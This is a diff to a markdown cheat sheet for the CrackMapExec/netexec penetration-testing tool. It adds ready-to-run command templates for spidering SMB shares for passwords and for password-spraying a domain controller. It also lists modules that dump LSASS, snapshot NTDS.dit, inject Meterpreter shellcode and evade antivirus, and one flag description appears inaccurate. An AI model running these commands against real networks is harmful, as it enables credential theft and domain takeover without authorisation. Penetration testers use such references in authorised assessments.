@@ -69,6 +69,19 @@
 | `-t <n>` | Thread count |
 | `--timeout <n>` | Per-host timeout |
 
+### Share spidering (data mining)
+| Flag | Meaning |
+|---|---|
+| `--spider <share>` | Recursively list a share's contents |
+| `--spider-folder <path>` | Start spider at a subfolder |
+| `--pattern <regex>` | Only print files matching pattern (e.g. `password`, `\.kdbx$`) |
+| `--content` | Grep **inside** files (not just names) |
+| `--depth <n>` | Max recursion depth |
+| `--exclude-dirs <list>` | Skip these dirs |
+| `--sharename <name>` | Scope subsequent flags to one named share |
+| `--obfs` | Obfuscated execution (evade defender) |
+| `--no-bruteforce` | During spray mode, skip users already locked |
+
 ### SMB enumeration
 | Flag | Meaning |
 |---|---|
@@ -114,6 +127,13 @@ List: `crackmapexec smb -L` — highlights:
 | `enum_avproducts` | Find installed AV |
 | `enum_chrome` | Dump saved Chrome creds |
 | `spider_plus` | Recursively list file shares |
+| `bloodhound` | Runs SharpHound-equivalent collection, drops zip for BloodHound |
+| `procdump` | Remote `procdump.exe` of lsass.exe → pulls dump back |
+| `met_inject` | Inject Meterpreter shellcode into a process |
+| `lsassy` | Remote LSASS read (stealthier than procdump) |
+| `ntdsutil` | Trigger `ntdsutil ifm` to snapshot NTDS.dit |
+| `enum_dns` | Dump AD-integrated DNS records |
+| `empire_exec` | Launch Empire launcher |
 | `nopac` | Check/exploit CVE-2021-42278/42287 (sAMAccountName) |
 | `zerologon` | Check CVE-2020-1472 |
 | `petitpotam` | Coerce NTLM auth |
@@ -178,7 +198,34 @@ crackmapexec smb <IP> -u <U> -p <P> -M spider_plus
 # 15. Vuln checks
 crackmapexec smb <DC-IP> -u '' -p '' -M zerologon
 crackmapexec smb <DC-IP> -u <U> -p <P> -M nopac
+
+# 16. Spider a specific share for passwords
+crackmapexec smb <IP> -u <U> -p <P> --shares
+crackmapexec smb <IP> -u <U> -p <P> --spider SYSVOL --pattern 'password'
+crackmapexec smb <IP> -u <U> -p <P> --spider Users --content --pattern 'password|secret'
+
+# 17. Password spray workflow (safe)
+# Step 1: pull policy so you know lockout threshold
+crackmapexec smb <DC-IP> -u alice -p 'Pass123' --pass-pol
+# Step 2: spray 1 pw to many users, stop on lockouts
+crackmapexec smb <DC-IP> -u users.txt -p 'Winter2026!' \
+  --continue-on-success --no-bruteforce --gfail-limit 10
+
+# 18. Modern alternative — netexec (same flags)
+nxc smb 10.10.10.0/24 -u users.txt -p 'Summer2026!' --continue-on-success
 ```
+
+---
+
+## 🆕 netexec (nxc) — CME's modern fork
+
+CrackMapExec is unmaintained since ~2023. **netexec** (`nxc`) is a drop-in replacement with the same CLI and active module development.
+
+- Install: `pipx install netexec` or `sudo apt install netexec`
+- Call: replace `crackmapexec` with `nxc` — every flag works identically
+- New in nxc: `rdp` protocol built-in, `--kdcHost`, improved Kerberos, more modules (`-M adcs`, `-M teams_localdb`, `-M wifi`)
+
+If `crackmapexec` is missing on your Parrot build, `nxc --version` will be present.
 
 ---
 
